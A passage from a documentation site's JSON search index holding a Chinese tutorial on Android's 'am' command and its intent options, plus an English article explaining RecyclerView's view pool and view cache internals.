\u201cgityuan.com\u201d\u4e3avalue\u3002\u901a\u8fc7java\u4ee3\u7801\u8981\u5b8c\u6210\u8be5\u529f\u80fd\u867d\u7136\u4e0d\u590d\u6742\uff0c\u4f46\u81f3\u5c11\u9700\u8981\u4e00\u4e2aandroid\u73af\u5883\uff0c\u800c\u901a\u8fc7adb\u7684\u65b9\u5f0f\uff0c\u53ea\u9700\u8981\u5728adb\u7a97\u53e3\uff0c\u8f93\u5165\u5982\u4e0b\u547d\u4ee4\u4fbf\u53ef\u5b8c\u6210: am start -n com.gityuan.app/.MainActivity -es website gityuan.com am\u547d\u4ee4\u8fd8\u53ef\u4ee5\u542f\u52a8Service\u3001Broadcast\uff0c\u6740\u8fdb\u7a0b\uff0c\u76d1\u63a7\u7b49\u529f\u80fd\uff0c\u8fd9\u4e9b\u529f\u80fd\u90fd\u975e\u5e38\u4fbf\u6377\u8c03\u8bd5\u7a0b\u5e8f\uff0c\u63a5\u4e0b\u6765\u8bb2\u8ff0\u5173\u4e8eam\u66f4\u591a\u66f4\u8be6\u7ec6\u7684\u529f\u80fd\u3002","title":"\u542f\u52a8\u5e94\u7528"},{"location":"Android/Am%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95/#am_1","text":"","title":"\u4e8c\u3001Am\u547d\u4ee4"},{"location":"Android/Am%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95/#21","text":"\u547d\u4ee4\u683c\u5f0f\u5982\u4e0b\uff1a am [subcommand] [options] \u547d\u4ee4\u5217\u8868\u5982\u4e0b\uff1a \u547d\u4ee4 \u529f\u80fd \u5b9e\u73b0\u65b9\u6cd5 am start [options ] <INTENT > \u542f\u52a8Activity startActivityAsUser am startservice <INTENT > \u542f\u52a8Service startService am stopservice <INTENT > \u505c\u6b62Service stopService am broadcast <INTENT > \u53d1\u9001\u5e7f\u64ad broadcastIntent am kill <PACKAGE > \u6740\u6307\u5b9a\u540e\u53f0\u8fdb\u7a0b killBackgroundProcesses am kill-all \u6740\u6240\u6709\u540e\u53f0\u8fdb\u7a0b killAllBackgroundProcesses am force-stop <PACKAGE > \u5f3a\u6740\u8fdb\u7a0b forceStopPackage am hang \u7cfb\u7edf\u5361\u4f4f hang am restart \u91cd\u542f restart am bug-report \u521b\u5efabugreport requestBugReport am dumpheap <pid > <file > \u8fdb\u7a0bpid\u7684\u5806\u4fe1\u606f\u8f93\u51fa\u5230file dumpheap am send-trim-memory <pid > <level > \u6536\u7d27\u8fdb\u7a0b\u7684\u5185\u5b58 setProcessMemoryTrimLevel am monitor \u76d1\u63a7 MyActivityController.run am\u547d\u4ee4\u5b9e\u7684\u5b9e\u73b0\u65b9\u5f0f\u5728Am.java\uff0c\u6700\u7ec8\u51e0\u4e4e\u90fd\u662f\u8c03\u7528 ActivityManagerService \u76f8\u5e94\u7684\u65b9\u6cd5\u6765\u5b8c\u6210\u3002 \u6bd4\u5982\u547d\u4ee4 am start -a android.intent.action.VIEW -d http://gityuan.com \uff0c \u542f\u52a8Acitivty\u6700\u7ec8\u8c03\u7528\u7684\u662fActivityManagerService\u7c7b\u7684startActivityAsUser()\u65b9\u6cd5\u6765\u5b8c\u6210\u7684\u3002 \u518d\u6bd4\u5982 am kill-all \u547d\u4ee4\uff0c\u6700\u7ec8\u7684\u5b9e\u73b0\u5de5\u4f5c\u662f\u7531ActivityManagerService\u7684killBackgroundProcesses()\u65b9\u6cd5\u5b8c\u6210\u7684\u3002 \u63a5\u4e0b\u6765\uff0c\u8bf4\u8bf4 [options ]\u548c <INTENT >\u53c2\u6570\u542b\u4e49\u548c\u4f7f\u7528\u3002","title":"2.1 \u547d\u4ee4\u5217\u8868"},{"location":"Android/Am%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95/#22-activity","text":"\u5148\u6765\u4ecb\u7ecd\u4e00\u4e0b\u542f\u52a8Activity\u547d\u4ee4 am start [options] <INTENT> \u4f7f\u7528options\u53c2\u6570\uff0c\u63a5\u4e0b\u6765\u5217\u4e3eActivity\u547d\u4ee4\u7684[options]\u53c2\u6570\uff1a -D: \u5141\u8bb8\u8c03\u8bd5\u529f\u80fd -W: \u7b49\u5f85app\u542f\u52a8\u5b8c\u6210 -R <COUNT >: \u91cd\u590d\u542f\u52a8Activity COUNT\u6b21 -S: \u542f\u52a8activity\u4e4b\u524d\uff0c\u5148\u8c03\u7528forceStopPackage()\u65b9\u6cd5\u5f3a\u5236\u505c\u6b62app. \u2013opengl-trace: \u8fd0\u884c\u83b7\u53d6OpenGL\u51fd\u6570\u7684trace \u2013user <USER_ID > | current: \u6307\u5b9a\u7528\u6237\u6765\u8fd0\u884cApp,\u9ed8\u8ba4\u4e3a\u5f53\u524d\u7528\u6237\u3002 \u2013start-profiler <FILE >: \u542f\u52a8profiler\uff0c\u5e76\u5c06\u7ed3\u679c\u53d1\u9001\u5230 <FILE >; -P <FILE >: \u7c7b\u4f3c \u2013start-profiler\uff0c\u4e0d\u540c\u7684\u662f\u5f53app\u8fdb\u5165idle\u72b6\u6001\uff0c\u5219\u505c\u6b62profiling \u2013sampling INTERVAL: \u8bbe\u7f6eprofiler \u53d6\u6837\u65f6\u95f4\u95f4\u9694\uff0c\u5355\u4f4dms; \u542f\u52a8Activity\u7684\u5b9e\u73b0\u539f\u7406\uff1a \u5b58\u5728-W\u53c2\u6570\u5219\u8c03\u7528startActivityAndWait()\u65b9\u6cd5\u6765\u8fd0\u884c\uff0c\u5426\u5219startActivityAsUser()\u3002","title":"2.2 Activity\u542f\u52a8\u547d\u4ee4"},{"location":"Android/Am%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95/#23-trim-memory","text":"\u6536\u7d27\u5185\u5b58\u547d\u4ee4 am send-trim-memory <pid> <level> \u4f8b\u5982\uff1a \u5411pid=12345\u7684\u8fdb\u7a0b\uff0c\u53d1\u51falevel=RUNNING_LOW\u7684\u6536\u7d27\u5185\u5b58\u547d\u4ee4 am send-trim-memory 12345 RUNNING_LOW\u3002 \u90a3\u4e48level\u53d6\u503c\u8303\u56f4\u4e3a\uff1a HIDDEN\u3001RUNNING_MODERATE\u3001BACKGROUND\u3001RUNNING_LOW\u3001MODERATE\u3001RUNNING_CRITICAL\u3001COMPLETE\u3002","title":"2.3 trim-memory\u547d\u4ee4"},{"location":"Android/Am%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95/#24-intent","text":"Intent\u7684\u53c2\u6570\u548cflags\u8f83\u591a\uff0c\u672c\u6587\u4e3a\u65b9\u4fbf\u8d77\u89c1\uff0c\u5206\u4e3a3\u79cd\u7c7b\u578b\u53c2\u6570\uff0c\u5e38\u7528\u53c2\u6570\uff0cExtra\u53c2\u6570\uff0cFlags\u53c2\u6570\u3002","title":"2.4 Intent\u53c2\u6570"},{"location":"Android/Am%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95/#241","text":"-a <ACTION> : \u6307\u5b9aIntent action\uff0c \u5b9e\u73b0\u539f\u7406Intent.setAction()\uff1b -n <COMPONENT> : \u6307\u5b9a\u7ec4\u4ef6\u540d\uff0c\u683c\u5f0f\u4e3a{\u5305\u540d}/.{\u4e3bActivity\u540d}\uff0c\u5b9e\u73b0\u539f\u7406Intent.setComponent(\uff09\uff1b -d <DATA_URI> : \u6307\u5b9aIntent data URI -t <MIME_TYPE> : \u6307\u5b9aIntent MIME Type -c <CATEGORY> [-c <CATEGORY>] ...] :\u6307\u5b9aIntent category\uff0c\u5b9e\u73b0\u539f\u7406Intent.addCategory() -p <PACKAGE> : \u6307\u5b9a\u5305\u540d\uff0c\u5b9e\u73b0\u539f\u7406Intent.setPackage(); -f <FLAGS> : \u6dfb\u52a0flags\uff0c\u5b9e\u73b0\u539f\u7406Intent.setFlags(int )\uff0c\u7d27\u63a5\u7740\u7684\u53c2\u6570\u5fc5\u987b\u662fint\u578b\uff1b \u5b9e\u4f8b am start -a android.intent.action.VIEW am start -n com.gityuan.app/.MainActivity am start -d content://contacts/people/1 am start -t image/png am start -c android.intent.category.APP_CONTACTS","title":"2.4.1 \u5e38\u7528\u53c2\u6570"},{"location":"Android/Am%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95/#242-extra","text":"(1). \u57fa\u672c\u7c7b\u578b | \u53c2\u6570 | -e/-es | -esn | -ez | -ei | -el | -ef | -eu | -ecn | | \u7c7b\u578b | String | (String)null | boolean | int | long | float | uri | component | \u6bd4\u5982\u53c2\u6570es\u662fExtra String\u9996\u5b57\u6bcd\u7b80\u79f0\uff0c\u5b9e\u4f8b\uff1a am start -n com.gityuan.app/.MainActivity -es website gityuan.com \u6b64\u5904 -es website gityuan.com \uff0c\u7b49\u4ef7\u4e8eIntent.putExtra(\u201cwebsite\u201d, \u201cgityuan.com\u201d); (2). \u6570\u7ec4\u7c7b\u578b | \u53c2\u6570 | -esa | -eia | -ela | -efa | | \u6570\u7ec4\u7c7b\u578b | String[] | int[] | long[] | float[] | \u6bd4\u5982\u53c2\u6570eia\uff0c\u662fExtra int array\u9996\u5b57\u6bcd\u7b80\u79f0\uff0c\u591a\u4e2avalue\u503c\u4e4b\u95f4\u4ee5\u9017\u53f7\u9694\u5f00\uff0c\u5b9e\u4f8b\uff1a am start -n com.gityuan.app/.MainActivity -ela weekday 1,2,3,4,5 \u6b64\u5904 -ela weekday 1,2,3,4,5 \uff0c\u7b49\u4ef7\u4e8eIntent.putExtra(\u201cweekday\u201d, new int[]{1,2,3,4,5}); (3). ArrayList\u7c7b\u578b | \u53c2\u6570 | -esal | -eial | -elal | -efal | | List\u7c7b\u578b | String | int | long | float | \u6bd4\u5982\u53c2\u6570efal\uff0c\u662fExtra float Array List\u9996\u5b57\u6bcd\u7b80\u79f0\uff0c\u591a\u4e2avalue\u503c\u4e4b\u95f4\u4ee5\u9017\u53f7\u9694\u5f00\uff0c\u5b9e\u4f8b\uff1a am start -n com.gityuan.app/.MainActivity -efal nums 1.2,2.2 \u6b64\u5904 -efal nums 1.2,2.2 \uff0c\u7b49\u4ef7\u4e8e\u5148\u6784\u9020ArrayList\u53d8\u91cf\uff0c\u518d\u901a\u8fc7putExtra\u653e\u5165\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002","title":"2.4.2 Extra\u53c2\u6570"},{"location":"Android/Am%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95/#243-flags","text":"\u5728\u53c2\u6570\u7c7b\u578b1\u4e2d\uff0c\u63d0\u5230\u6709 -f <FLAGS> \uff0c\u662f\u901a\u8fc7 Intent.setFlags(int ) \u65b9\u6cd5\uff0c\u6765\u8bbe\u7f6eIntent\u7684flags.\u672c\u5c0f\u8282\u4e5f\u662f\u5173\u4e8eflags\uff0c\u662f\u901a\u8fc7 Intent.addFlags(int ) \u65b9\u6cd5\u3002\u5982\u4e0b\u6240\u793a\uff0c\u6240\u6709\u7684flags\u53c2\u6570\u3002 [--grant-read-uri-permission] [--grant-write-uri-permission] [--grant-persistable-uri-permission] [--grant-prefix-uri-permission] [--debug-log-resolution] [--exclude-stopped-packages] [--include-stopped-packages] [--activity-brought-to-front] [--activity-clear-top] [--activity-clear-when-task-reset] [--activity-exclude-from-recents] [--activity-launched-from-history] [--activity-multiple-task] [--activity-no-animation] [--activity-no-history] [--activity-no-user-action] [--activity-previous-is-top] [--activity-reorder-to-front] [--activity-reset-task-if-needed] [--activity-single-top] [--activity-clear-task] [--activity-task-on-home] [--receiver-registered-only] [--receiver-replace-pending] \u4f8b\u5982\uff0c\u53d1\u9001action=\u201dbroadcast.demo\u201d\u7684\u5e7f\u64ad\uff0c\u5e76\u4e14\u5bf9\u4e8eforceStopPackage()\u7684\u5e94\u7528\u4e0d\u5141\u8bb8\u63a5\u6536\u8be5\u5e7f\u64ad\uff0c\u547d\u4ee4\u5982\u4e0b\uff1a am broadcast -a broadcast.demo --exclude-stopped-packages \u539f\u6587\u94fe\u63a5\uff1a http://gityuan.com/2016/02/27/am-command/","title":"2.4.3 Flags\u53c2\u6570"},{"location":"Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/","text":"Anatomy of RecyclerView:a Search for a ViewHolder Pavel Shmakov FollowMar 11, 2017 \u00b715 min readAnatomy of RecyclerView: a Search for a ViewHolder Intro In this series of articles I\u2019m going to share my knowledge of the inner workings of RecyclerView. Why? Just think about it: RecyclerView is needed almost in every modern Android app, so the way developers work with it affects the experience of millions and millions of users. And yet, what kind of educational material on RecyclerView do we have? You can surely find some basic tutorials on how to use RecyclerView, but what about how it works ? The \u201cblack box\u201d approach is definitely not good enough, especially if you are doing complex customizations or optimizing the performance. \u00b9 The \u201cdeepest\u201d material out there is probably the RecyclerView ins and outs talk at Google I/O 2016, which I recommend, but seriously, that\u2019s not even close to \u201cins and outs\u201d, that\u2019s just the tip of the iceberg. My goal is to go deeper than that. I assume that the reader has basic knowledge of RecyclerView, stuff like what LayoutManager is, how to notify Adapter of particular changes in data or how to use item view types. In this first part we will be figuring out what\u2019s going on in just one method inside RecyclerView: getViewByPosition() . This is one of the most crucial bits of source code, and by studying it, we will learn about many aspects of RecyclerView, such as ViewHolder recycling, hidden views, predictive animations and stable ids. You may be surprised to see predictive animations here. Well, the thing is, despite the best efforts of guys at Google to decouple responsibilities of different components of RecyclerView, a lot of \u201cknowledge\u201d is still shared between them, predictive animations being one of those things. There is no way to avoid talking about them at one point or another. So, during laying items out the LayoutManager asks the RecyclerView \u201cplease give me a View at position 8\u201d. And here is what RecycleView does in response: Searches changed scrap Searches attached scrap Searches non-removed hidden views Searches the view cache If Adapter has stable ids, searches attached scrap and view cache again for given id. Searches the ViewCacheExtension Searches the RecycledViewPool If it fails to find a suitable View in all of those places, it creates one by calling adapter\u2019s onCreateViewHolder() method. It then binds the View via onBindViewHolder() if necessary, and finally returns it. As you see, there\u2019s a lot going on here, much more than just one pool of reusable ViewHolders as one may have expected. Our goal is to figure out what all those caches are about, how they work and why they are needed. We\u2019ll go through them one by one (in the order I think would be the best), and our first stop is the RecycledViewPool. RecycledViewPool We\u2019d like to have an answer to a few questions about each kind of cache: what is its backing data structure, under which conditions the ViewHolders are stored there and retrieved from there, and, most importantly, what\u2019s the purpose of it. You probably know the purpose of the pool very well: while scrolling, say, downwards the views that disappear on top are recycled into the pool to be reused for the views that emerge from the bottom. We\u2019ll talk about other scenarios where ViewHolders go to the pool a little bit later. But first let\u2019s take a look at some of the RecycledViewPool\u2019s code (which is an inner class of RecyclerView.Recycler): public static classRecycledViewPool {private SparseArray<ArrayList<ViewHolder>> mScrap =new SparseArray<>();private SparseIntArray mMaxScrap = new SparseIntArray(); \u2026public ViewHolder getRecycledView(int viewType) {ArrayList<ViewHolder> scrapHeap = mScrap.get(viewType); \u2026 First of all, don\u2019t let the name mScrap confuse you \u2014 this has nothing to do with attached or changed scrap mentioned in the list above. We see that each view type has its own pool of ViewHolders. When RecyclerView runs out of all other possibilities during a search for a ViewHolder, it asks the pool to give a ViewHolder with correct view type; at that point, view type is the only thing that matters. Now, each view type has it\u2019s own capacity. It is 5 by default, but you can change it like that: recyclerView.getRecycledViewPool() .setMaxRecycledViews(***SOME_VIEW_TYPE***, ***POOL_CAPACITY***); This is a very important point of flexibility. If you have dozens of same-type items on screen, which often change simultaneously, make the pool bigger for that view type. And if you know, that items of some view type are so rare, that they never appear on screen in quantity more than one, set the pool size 1 for that view type. Otherwise sooner or later the pool will be filled with 5 of those items, and 4 of them will just sit there unused, which is a waste of memory. The methods getRecyclerView() , putRecycledView() , clear() are public, so you can manipulate the contents of the pool. Using putRecycledView() manually, e.g. in order to prepare some ViewHolders beforehand, is a bad idea, though. You should create ViewHolder only in onCreateViewHolder() method of your Adapter, otherwise the ViewHolders can appear in states that RecyclerView doesn\u2019t expect. \u00b2 Another cool feature is that along with the getter getRecycledViewPool() there is a setter setRecycledViewPool() , so you can reuse a single pool for multiple RecycleViews. Finally, I\u2019ll note that the pool for each view type works as a stack (last in \u2014 first out). We\u2019ll see why this is good later. Ways to pool Now let\u2019s address the question of when the ViewHolders are thrown into the pool. There are 5 scenarios: A view went out of RecyclerView\u2019s bounds during scrolling. Data has changed so that the view is no longer seen. Addition to the pool happens when the disappearance animation finishes. An item in the view cache has been updated or removed. During a search for a ViewHolder, one was found in scrap or cache with position we want, but turned out to be unsuitable because of the wrong view type or id (if adapter has stable ids). \u00b3 The LayoutManager added a view at pre-layout, but didn\u2019t add that view in post-layout. The first two scenarios are pretty obvious. One thing to note, though, is that scenario 2 is triggered not only by removal of an item in question, but also, for example, by insertion of other items, which push the given item out of bounds. The other scenarios require a bit of comment. We\u2019ve not covered the view cache and scrap yet, but the idea behind scenarios 3 and 4 is simple. The pool is a place for the views we know to be \u201cdirty\u201d and requiring rebinding. ViewHolders in all caches, except for the pool, retain some of their state (most importantly, positions). All those caches are searched by position in hope that some ViewHolder can be reused as-is. By contrast, when a view goes to pool, it\u2019s state (all the flags, position, etc.) is cleared. The only things that remain are associated view and the view type. The pool is searched by the view type, as we know, and when a ViewHolder is found there, it starts a new life. Given that picture, scenarios 3 and 4 shouldn\u2019t be a mystery: for example, if we see a item in the view cache being removed, there\u2019s no point in holding it in that cache any more, since it won\u2019t be reused as-is for the same position. It\u2019s not nice to throw it away completely, though, so we throw it into the pool instead. The last scenario requires us to know what pre-layout and post-layout are. Well, let\u2019s just go ahead and figure that out! That scenario is definitely not the most crucial aspect of the pre/post-layout mechanism, but this mechanism is hugely important in general and is manifesting itself in every part of RecyclerView, so we\u2019ll have to know it anyway. Offtopic: pre-layout, post-layout and predictive animations Consider a scenario where we have items a, b and c, of which a and b fit on the screen. We delete the b , which brings c into view: What we\u2019d like to see is c smoothly sliding from the bottom up to it\u2019s new place. But how can that happen? We know the final location of c from the new layout, but how do we know where it should slide from? It would be wrong of RecyclerView or ItemAnimator to just assume by looking at the new layout that c should come from the bottom. We might have some custom LayoutManager where it should come from the side or something. So we need some more help from the LayoutManager. Can we use the previous layout? No, there\u2019s no \u0441 there. At that point no-one new that b was going to be deleted, so laying out c was rightly considered by LayoutManager to be a waste of resources. The solution guys at Google offered is as follows. After a change in the Adapter happens, the RecyclerView requests not one but two layouts from the LayoutManager. The first one \u2014 the pre-layout, lays out items in the previous adapter state, but uses the adapter changes as a hint that it might be a good idea to lay out some extra views. In our example, since we now know that b is being deleted, we additionally lay out c , despite the fact it\u2019s out of bounds. The second one \u2014 the post-layout, is just a normal layout corresponding to the adapter state after the changes. Now, by comparing the locations of c in pre-layout and post-layout, we can animate its appearance properly. This kind of animation \u2014 when the animated view is not present either in previous layout or in the new one \u2014 is called predictive animation, which is one of the most important concepts in RecyclerView. We\u2019ll discuss it in greater detail in later parts of this series. But now let\u2019s quickly look at another example: what if b is changed instead of being deleted? This might come as a surprise, but the LayoutManager still lays out c in the pre-layout phase. Why? Because maybe the change of b would make it become smaller in height, who knows? And if b becomes smaller, c might pop up from the bottom, so we better lay it out in pre-layout. But then later, in post-layout, it appeared to be not the case, say we just changed some TextView inside b. So c is not needed, and is thrown into the pool. That\u2019s the scenario 5 of getting oneself into the pool. It is hopefully clear now and we can go back to the RecycledViewPool. RecycledViewPool, continued When we encounter one of the scenarios when a ViewHolder should go to the pool, there are still two more obstacles on its way there: it might not be recyclable and it\u2019s View might be in transient state. Recyclability Recyclability is just a flag in ViewHolder, that you can manipulate by using setIsRecyclable() method of ViewHolder class. RecycleView makes use of it as well, making ViewHolders non-recyclable during animations. Manipulating a single flag from different independent places is usually a bad idea. For example, RecyclerView calls setIsRecyclable(true) when animation ends, by you don\u2019t want it to be recyclable for some reason specific to your application. But things don\u2019t actually break in this case because calls to setIsRecyclable() are paired. That is, if you call setIsRecyclable(false) twice, then calling setIsRecyclable(true) only once doesn\u2019t make the ViewHolder recyclable, you need to call it twice as well. Transient state The View\u2019s transient state is a very similar thing. It\u2019s a flag in the View, manipulated by setHasTransientState() method, and the calls are paired as well. The View class itself doesn\u2019t use the flag, but just holds it. It serves as a hint for widgets like ListView and RecyclerView, that it\u2019s better not to reuse this View for new content at this time. You can set this flag yourself, but also the ViewPropertyAnimator (that is when you do someView.animate()\u2026 ) automatically sets it to true at the start and to false at the end of animation. \u2074 Note that if you use, for example, a ValueAnimator to animate your views, you would have to manage the transient state yourself. One last thing to note about the transient state is that it is propagated from children to parents, all the way up to the root view. So if you animate some internal view of an item in the list, not only that view, but the item\u2019s root view, which a ViewHolder holds reference to, goes to transient state. OnFailedToRecycleView If a ViewHolder about to be recycled fails either recyclability or transient state check, the onFailedToRecycleView() method of your Adapter is called. Now, this is a really important point: this method is not just a notification of an event, but a question to you on how this situation should be dealt with. Returning true from onFailedToRecycledView() means \u201crecycle it anyway\u201d. One situation where this is appropriate is when you clear all the animations and other sources of this trouble when binding a new item. Alternatively, you can deal with these things right in the onFailedToRecycledView() method. What you shouldn\u2019t do is to ignore onFailedToRecycledView() completely. One scenario in which that might hurt you is the following. Imagine you are fading in images in the items when they come into view. If the user scrolls your list fast enough, the images won\u2019t finish fading in when they go out of view, rendering the ViewHolders ineligible for recycling. So you\u2019ll have laggy scroll, and on top of that, new and new ViewHolders will be created, cluttering the memory. For Russian-speaking readers I recommend this talk by Konstantin Zaikin, where, among other things, this scenario is shown in action: https://events.yandex.ru/lib/talks/3456/ Succeeding in recycling a ViewHolder leads to a call to onViewRecycled() method, which is a good place to release heavy resources, such as images. Remember that some ViewHolder instances can end up sitting in the pool for a long time without usage, which may be a big waste of memory. We now move on to the next cache \u2014 the view cache. View Cache When I say \u201cview cache\u201d or just \u201ccache\u201d what I refer to is mCachedViews field found in RecyclerView.Recycler class. It\u2019s also called \u201cfirst level cache\u201d in some comments in the code. This is just an ArrayList of ViewHolders, no splitting by view types here. The default capacity is 2, and you can tweak it via setItemViewCacheSize() method of RecyclerView. As I mentioned before, the most important difference between the pool and other caches (including the view cache), is that those other caches are searched for a ViewHolder associated with given position, while the pool is searched by view type. When a ViewHolder is in the view cache, we hope to to reuse it \u201cas-is\u201d, without rebinding, at the same position as the one it was at before it got into the cache. So let\u2019s make this distinction perfectly clear: If a ViewHolder was found nowhere , it is created and bound . If a ViewHolder was found in pool , it is bound . If a ViewHolder was found in cache , there is nothing to be done. At this point one important thing becomes very clear: a ViewHolder being bound and recycled into pool ( onViewRecycled() ) is not the same thing as an item in list going in and out of visible bounds. When it goes out, its ViewHolder can go to view cache instead of pool, and when it comes in, the ViewHolder is sometimes retrieved from view cache and is not bound. If you need to track the presence of items on screen, use the onViewAttachedToWindow() and onViewDetachedFromWindow() callbacks of your Adapter. Filling pool and cache Now, to the next question: how do ViewHolders end up in the view cache? When I was talking about the scenarios, which lead to the pool, I actually deceived you a little bit. In those scenarios (except for the third one) the ViewHolder goes either to the cache or to the pool. \u2075 Let me illustrate the rules by which either the cache or the pool is selected. Say, we have empty pool and cache initially and recycle the items one by one. This is how the pool and the cache is filled (assuming default capacities and one view type): So, as long as the cache isn\u2019t full, ViewHolders go there. If it\u2019s full, a new ViewHolder pushes a ViewHolder from the \u201cother end\u201d of the cache into the pool. If a pool is already full, that ViewHolder is pushed into oblivion, to the garbage collector that is. \u2076 Pool and Cache in Action Now let\u2019s look at the way pool and cache behave in a couple of actual RecyclerView usage scenarios. Consider scrolling: As we scroll downwards, there is a \u201ctail\u201d behind the currently seen items consisting of cached items and then a pooled item. When the item 8 appears on screen, no suitable ViewHolder is found in cache: no ViewHolder associated with position 8 there. So we use a pooled ViewHolder, which was previously at position 3. When item 6 disappears on top, it goes to the cache, pushing 4 into the pool. The picture is different when we start scrolling in the opposite direction: Here we find a ViewHolder for position 5 in view cache and reuse it right away, without rebinding. And that seems to be the main use-case of the cache \u2014 to make scrolling in opposite direction, to the items we\u2019ve just seen, more efficient. So if you have a news feed, the cache might be useless, since users won\u2019t go back too often. But if it\u2019s a list of things to choose from, say a gallery of wallpapers, you might want to extend the capacity of the cache. A couple of things to note here. First, what if we scroll up to view 3? Remember that the pool works like a stack, so if we didn\u2019t do anything but scrolling since the last time we saw 3, then the ViewHolder 3 will be the last one to be put into the pool and thus is now chosen to be rebound at position 3. If the data didn\u2019t change, we actually don\u2019t need to do any rebinding. You should always check in your onBindViewHolder() if you actually need to change this TextView or that ImageView etc., and this is an example of a situation when you don\u2019t. Second, notice that there is always no more than one item (per view type) in the pool while scrolling! (Of course, if you have a multi-column grid with n columns, then you\u2019ll have n items in the pool.) The other items that ended up in the pool via scenarios 2\u20135, just stay there uselessly during scrolling. Now let\u2019s look at a scenario, in which, by contrast, lots of items go into the pool: calling notifyDataSetChanged() (or notifyItemRangeChanged() with some wide range): All the ViewHolders become invalid, cache is not a suitable place for them, and they all try to go to pool. There might be not enough space for them, so some unlucky ones will be garbage collected and then created again. In contrast to scrolling, you might want a bigger pool in this situation. Another case in which a big pool is useful is jumping from one position to another programmatically via scrollToPosition() . So how do we choose the optimal size of the pool? It seems that the optimal strategy is to extend the pool right before you\u2019ll need it to be big, and shrink it right afterwards. One dirty way to implement this is the following: **recyclerView**.getRecycledViewPool().setMaxRecycledViews(0, 20);**adapter**.notifyDataSetChanged();**new** Handler().post(**new** Runnable() { @Override **public void** run() { **recyclerView**.getRecycledViewPool() .setMaxRecycledViews(0, 1); }}); Continued here: https://medium.com/@pavelshmakov/anatomy-of-recyclerview-part-1-a-search-for-a-viewholder-continued-d81c631a2b91 ^ \u00b9 In fact, even understanding public API of RecyclerView requires you to know some of the inner workings. For example, the javadoc to setHasStableIds() method tells you nothing about why would you want to use it. ^ \u00b2 E.g. the correct view type is set in createViewHolder() method right after the Adapter call, and the field is package local, so you can\u2019t set it yourself. ^ \u00b3An example when this happens: change the item, so that it\u2019s view type changes, call notifyItemChanged() . Also, disable change animations in your ItemAnimator, otherwise scenario 2 will happen. ^ \u2074 One other example of View being in transient state is EditText with some text being selected or in the process of editing. ^ \u2075 The recyclability and transient state checks come before selection between cache and pool, which to be honest doesn\u2019t make much sense to me, since views in cache are supposed to reappear exactly in the state they were when disappearing. ^ \u2076 In support version 23 this mechanism is broken by a simple off-by-one indexing mistake. The number of ViewHolders in the cache alternates between 1 and 2 as we recycle ViewHolders one by one. \u539f\u6587\u94fe\u63a5\uff1a https://medium.com/android-news/anatomy-of-recyclerview-part-1-a-search-for-a-viewholder-404ba3453714","title":"Anatomy of RecyclerView:a Search for a ViewHolder"},{"location":"Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/#anatomy-of-recyclerviewa-search-for-a-viewholder","text":"Pavel Shmakov FollowMar 11, 2017","title":"Anatomy of RecyclerView:a Search for a ViewHolder"},{"location":"Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/#15-min-readanatomy-of-recyclerview-a-search-for-a-viewholder","text":"","title":"\u00b715 min readAnatomy of RecyclerView: a Search for a ViewHolder"},{"location":"Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/#intro","text":"In this series of articles I\u2019m going to share my knowledge of the inner workings of RecyclerView. Why? Just think about it: RecyclerView is needed almost in every modern Android app, so the way developers work with it affects the experience of millions and millions of users. And yet, what kind of educational material on RecyclerView do we have? You can surely find some basic tutorials on how to use RecyclerView, but what about how it works ? The \u201cblack box\u201d approach is definitely not good enough, especially if you are doing complex customizations or optimizing the performance. \u00b9 The \u201cdeepest\u201d material out there is probably the RecyclerView ins and outs talk at Google I/O 2016, which I recommend, but seriously, that\u2019s not even close to \u201cins and outs\u201d, that\u2019s just the tip of the iceberg. My goal is to go deeper than that. I assume that the reader has basic knowledge of RecyclerView, stuff like what LayoutManager is, how to notify Adapter of particular changes in data or how to use item view types. In this first part we will be figuring out what\u2019s going on in just one method inside RecyclerView: getViewByPosition() . This is one of the most crucial bits of source code, and by studying it, we will learn about many aspects of RecyclerView, such as ViewHolder recycling, hidden views, predictive animations and stable ids. You may be surprised to see predictive animations here. Well, the thing is, despite the best efforts of guys at Google to decouple responsibilities of different components of RecyclerView, a lot of \u201cknowledge\u201d is still shared between them, predictive animations being one of those things. There is no way to avoid talking about them at one point or another. So, during laying items out the LayoutManager asks the RecyclerView \u201cplease give me a View at position 8\u201d. And here is what RecycleView does in response: Searches changed scrap Searches attached scrap Searches non-removed hidden views Searches the view cache If Adapter has stable ids, searches attached scrap and view cache again for given id. Searches the ViewCacheExtension Searches the RecycledViewPool If it fails to find a suitable View in all of those places, it creates one by calling adapter\u2019s onCreateViewHolder() method. It then binds the View via onBindViewHolder() if necessary, and finally returns it. As you see, there\u2019s a lot going on here, much more than just one pool of reusable ViewHolders as one may have expected. Our goal is to figure out what all those caches are about, how they work and why they are needed. We\u2019ll go through them one by one (in the order I think would be the best), and our first stop is the RecycledViewPool.","title":"Intro"},{"location":"Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/#recycledviewpool","text":"We\u2019d like to have an answer to a few questions about each kind of cache: what is its backing data structure, under which conditions the ViewHolders are stored there and retrieved from there, and, most importantly, what\u2019s the purpose of it. You probably know the purpose of the pool very well: while scrolling, say, downwards the views that disappear on top are recycled into the pool to be reused for the views that emerge from the bottom. We\u2019ll talk about other scenarios where ViewHolders go to the pool a little bit later. But first let\u2019s take a look at some of the RecycledViewPool\u2019s code (which is an inner class of RecyclerView.Recycler): public static classRecycledViewPool {private SparseArray<ArrayList<ViewHolder>> mScrap =new SparseArray<>();private SparseIntArray mMaxScrap = new SparseIntArray(); \u2026public ViewHolder getRecycledView(int viewType) {ArrayList<ViewHolder> scrapHeap = mScrap.get(viewType); \u2026 First of all, don\u2019t let the name mScrap confuse you \u2014 this has nothing to do with attached or changed scrap mentioned in the list above. We see that each view type has its own pool of ViewHolders. When RecyclerView runs out of all other possibilities during a search for a ViewHolder, it asks the pool to give a ViewHolder with correct view type; at that point, view type is the only thing that matters. 